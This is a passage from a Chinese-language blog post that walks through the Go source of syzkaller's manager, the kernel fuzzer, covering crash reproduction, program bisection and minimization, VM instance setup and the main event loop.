*OptionalConfig)</span></span> (*ExecProgInstance, <span class="hljs-type">error</span>) &#123;<br>vmInst, err := vmPool.Create(vmIndex)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create VM: %v&quot;</span>, err)<br>&#125;<br>ret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInst.Close()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> ret, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>回到 <code>Run()</code>  中，其最后会调用 <code>context.repro()</code> <strong>正式开始复现 crash 的工作</strong>，检查结果后返回：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go">res, err := ctx.repro(entries, crashStart)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br><span class="hljs-comment">// Try to rerun the repro if the report is corrupted.</span><br><span class="hljs-keyword">for</span> attempts := <span class="hljs-number">0</span>; ctx.report.Corrupted &amp;&amp; attempts &lt; <span class="hljs-number">3</span>; attempts++ &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;report is corrupted, running repro again&quot;</span>)<br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;final repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br>res.Report = ctx.report<br>&#125;<br><span class="hljs-keyword">return</span> res, ctx.stats, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>repro()</code> 函数主要分两部分：</p><ul><li><p>调用 <code>extractProg()</code> <strong>获取触发 crash 的程序集合</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> repro(entries []*prog.LogEntry, crashStart <span class="hljs-type">int</span>) (*Result, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 去除在 crash 发生后执行的程序.</span><br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br><span class="hljs-keyword">if</span> ent.Start &gt; crashStart &#123;<br>entries = entries[:i]<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><br>reproStart := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;reproducing took %s&quot;</span>, time.Since(reproStart))<br>&#125;()<br><br>res, err := ctx.extractProg(entries)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>res.Opts.Repro = <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure></li><li><p>最小化程序集合并尝试生成可以触发该 crash 的 C 程序，返回结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 尝试最小化程序集</span><br>res, err = ctx.minimizeProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// 首先尝试在不简化配置的情况下提取 C repro.</span><br>res, err = ctx.extractC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// 简化配置并尝试提取 C repro.</span><br><span class="hljs-keyword">if</span> !res.CRepro &#123;<br>res, err = ctx.simplifyProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 简化 C 相关的配置.</span><br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>res, err = ctx.simplifyC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><code>extractProg()</code> 的逻辑比较简单：</p><ul><li>逆序后调用 <code>context.extractProgSingle()</code> <strong>逐个运行单个程序</strong>，若某一程序触发了 crash 则直接返回</li><li>若单一程序无法触发 crash，则调用 <code>context.extractProgBisect()</code> <strong>使用二分法找出触发 crash 的程序集合</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> extractProg(entries []*prog.LogEntry) (*Result, <span class="hljs-type">error</span>) &#123;<br>ctx.reproLogf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;extracting reproducer from %v programs&quot;</span>, <span class="hljs-built_in">len</span>(entries))<br>start := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.stats.ExtractProgTime = time.Since(start)<br>&#125;()<br><br><span class="hljs-comment">// Extract last program on every proc.</span><br>procs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br>procs[ent.Proc] = i<br>&#125;<br><span class="hljs-keyword">var</span> indices []<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, idx := <span class="hljs-keyword">range</span> procs &#123;<br>indices = <span class="hljs-built_in">append</span>(indices, idx)<br>&#125;<br>sort.Ints(indices)<br><span class="hljs-keyword">var</span> lastEntries []*prog.LogEntry<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(indices) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i-- &#123;<br>lastEntries = <span class="hljs-built_in">append</span>(lastEntries, entries[indices[i]])<br>&#125;<br><span class="hljs-keyword">for</span> _, timeout := <span class="hljs-keyword">range</span> ctx.testTimeouts &#123;<br><span class="hljs-comment">// 分别执行每个程序以检测由单个程序造成的简单的 crash.</span><br><span class="hljs-comment">// 程序被逆序执行, 通常最后一个程序就是罪魁祸首.</span><br>res, err := ctx.extractProgSingle(lastEntries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 若只有一个 entry 则不进行二分.</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// 执行多个程序并二分 log 以找到造成崩溃的多个程序.</span><br>res, err = ctx.extractProgBisect(entries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to extract reproducer&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这两个函数主要就是通过如下调用链来在 VM 中执行程序，这里就不展开了：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">context.test<span class="hljs-constructor">Prog()</span><br>context.test<span class="hljs-constructor">Progs()</span><br>context.test<span class="hljs-constructor">WithInstance()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProg()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProgFile()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ExecProgInstance</span>.</span></span>run<span class="hljs-constructor">Command()</span><br></code></pre></td></tr></table></figure><h4 id="②-循环启动协程进行-fuzzing"><a href="#②-循环启动协程进行-fuzzing" class="headerlink" title="② 循环启动协程进行 fuzzing"></a>② 循环启动协程进行 fuzzing</h4><p>此时已经不满足可以进行 crash 复现的条件了，因而会有第二个小循环启动新协程<strong>将资源池中剩余 VM 调度去 fuzzing</strong>， 并将结果输出到 <code>runDone</code> 中： </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> !canRepro() &#123;<br>idx := instances.TakeOne()<br><span class="hljs-keyword">if</span> idx == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting instance %v&quot;</span>, *idx)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>crash, err := mgr.runInstance(*idx)<br>runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;<br>&#125;()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstance()</code> 函数实际上会调用 <code>runInstanceInner()</code>，该函数<strong>仅当产生了 Crash 时返回的结果才不为 nil，即 runRepro 队列实际上为 Crash 队列：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstance(index <span class="hljs-type">int</span>) (*Crash, <span class="hljs-type">error</span>) &#123;<br>mgr.checkUsedFiles()<br>instanceName := fmt.Sprintf(<span class="hljs-string">&quot;vm-%d&quot;</span>, index)<br><br>rep, vmInfo, err := mgr.runInstanceInner(index, instanceName)<br><br>machineInfo := mgr.serv.shutdownInstance(instanceName)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmInfo) != <span class="hljs-number">0</span> &#123;<br>machineInfo = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>(vmInfo, <span class="hljs-string">&#x27;\n&#x27;</span>), machineInfo...)<br>&#125;<br><br><span class="hljs-comment">// Error that is not a VM crash.</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// No crash.</span><br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br>crash := &amp;Crash&#123;<br>vmIndex:     index,<br>hub:         <span class="hljs-literal">false</span>,<br>Report:      rep,<br>machineInfo: machineInfo,<br>&#125;<br><span class="hljs-keyword">return</span> crash, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstanceInner()</code> 的核心部分主要是：</p><ul><li><p>调用 <code>vmPool.Create()</code> 创建 VM，调用 <code>inst.Forward()</code> 进行 TCP 转发，拷贝 <code>syz-fuzzer</code> 与 <code>syz-executor</code> 到 VM 文件系统中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstanceInner(index <span class="hljs-type">int</span>, instanceName <span class="hljs-type">string</span>) (*report.Report, []<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>inst, err := mgr.vmPool.Create(index)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create instance: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inst.Close()<br><br>fwdAddr, err := inst.Forward(mgr.serv.port)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to setup port forwarding: %v&quot;</span>, err)<br>&#125;<br><br>fuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-comment">// 若提供了 ExecutorBin , 这意味着 syz-executor 早已在镜像中,</span><br><span class="hljs-comment">// 故无需进行拷贝.</span><br>executorBin := mgr.sysTarget.ExecutorBin<br><span class="hljs-keyword">if</span> executorBin == <span class="hljs-string">&quot;&quot;</span> &#123;<br>executorBin, err = inst.Copy(mgr.cfg.ExecutorBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br>fuzzerV := <span class="hljs-number">0</span><br>procs := mgr.cfg.Procs<br><span class="hljs-keyword">if</span> *flagDebug &#123;<br>fuzzerV = <span class="hljs-number">100</span><br>procs = <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用 <code>instance.FuzzerCmd()</code> 生成命令行后调用 <code>inst.Run()</code> 启动 <code>syz-fuzzer</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Run the fuzzer binary.</span><br>start := time.Now()<br>atomic.AddUint32(&amp;mgr.numFuzzing, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">defer</span> atomic.AddUint32(&amp;mgr.numFuzzing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>  <br>args := &amp;instance.FuzzerCmdArgs&#123;<br>Fuzzer:    fuzzerBin,<br>Executor:  executorBin,<br>Name:      instanceName,<br>OS:        mgr.cfg.TargetOS,<br>Arch:      mgr.cfg.TargetArch,<br>FwdAddr:   fwdAddr,<br>Sandbox:   mgr.cfg.Sandbox,<br>Procs:     procs,<br>Verbosity: fuzzerV,<br>Cover:     mgr.cfg.Cover,<br>Debug:     *flagDebug,<br>Test:      <span class="hljs-literal">false</span>,<br>Runtest:   <span class="hljs-literal">false</span>,<br>Optional: &amp;instance.OptionalFuzzerArgs&#123;<br>Slowdown:   mgr.cfg.Timeouts.Slowdown,<br>RawCover:   mgr.cfg.RawCover,<br>SandboxArg: mgr.cfg.SandboxArg,<br>&#125;,<br>&#125;<br>cmd := instance.FuzzerCmd(args)<br>outc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to run fuzzer: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用 <code>inst.MonitorExecution()</code> 监控 VM 运行，该函数主要是<strong>通过获取 kernel oops 来判断是否触发了 crash</strong>（KASAN 不会造成 kernel panic，从而使得一个 VM 实例长期运行，不过 dmesg 中仍有 oops）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmInfo []<span class="hljs-type">byte</span><br>rep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)<br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// This is the only &quot;OK&quot; outcome.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s: running for %v, restarting&quot;</span>, instanceName, time.Since(start))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>vmInfo, err = inst.Info()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInfo = []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error getting VM info: %v\n&quot;</span>, err))<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> rep, vmInfo, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="Step-3-等待处理不同-channel-数据"><a href="#Step-3-等待处理不同-channel-数据" class="headerlink" title="Step 3. 等待处理不同 channel 数据"></a>Step 3. 等待处理不同 channel 数据</h3><p><code>vmLoop()</code> 的最后主要就是一个大的 <code>select</code>，等待某个 channel 中有数据后进行处理，之后重新跳回等待处理或是开始下一轮循环：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> stopRequest <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br><span class="hljs-keyword">if</span> !stopPending &amp;&amp; canRepro() &#123;<br>stopRequest = mgr.vmStop<br>&#125;<br><br>wait:<br><span class="hljs-keyword">select</span> &#123;<br></code></pre></td></tr></table></figure><p>首先是资源池的 <code>Freed</code> channel，在 <code>Put()</code> 中会将空闲 VM idx 放回资源池后向该 channel 送入一个 <code>true</code>，而这里什么都没有做，笔者估计会在后续版本中更新：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-instances.Freed:<br><span class="hljs-comment">// An instance has been released.</span><br></code></pre></td></tr></table></figure><p><code>stopRequest</code> 其实是 <code>Manager.vmStop</code> ，这个 channel 会在 VM instance 所实现的 <code>Run()</code> 方法中被使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> stopRequest &lt;- <span class="hljs-literal">true</span>:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: issued stop request&quot;</span>)<br>stopPending = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>当 <code>runDone</code> 中有数据时说明<strong>fuzz 产生了 crash</strong>，此时会将产生 crash 的 VM 释放回资源池，将 crash 写入 <code>pendingRepro</code> 表中等待下一轮循环进行处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-runDone:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: instance %v finished, crash=%v&quot;</span>, res.idx, res.crash != <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &amp;&amp; shutdown != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v&quot;</span>, res.err)<br>&#125;<br>stopPending = <span class="hljs-literal">false</span><br>instances.Put(res.idx)<br><span class="hljs-comment">// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,</span><br><span class="hljs-comment">// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.</span><br><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &amp;&amp; res.crash != <span class="hljs-literal">nil</span> &#123;<br>needRepro := mgr.saveCrash(res.crash)<br><span class="hljs-keyword">if</span> needRepro &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add pending repro for &#x27;%v&#x27;&quot;</span>, res.crash.Title)<br>pendingRepro[res.crash] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>reproDone</code> 中为 crash 的复现结果，这里会保存复现结果并将对应的 crash 从 <code>reproducing</code> 表中删除</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-reproDone:<br>atomic.AddUint32(&amp;mgr.numReproducing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>crepro := <span class="hljs-literal">false</span><br>title := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> res.repro != <span class="hljs-literal">nil</span> &#123;<br>crepro = res.repro.CRepro<br>title = res.repro.Report.Title<br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v 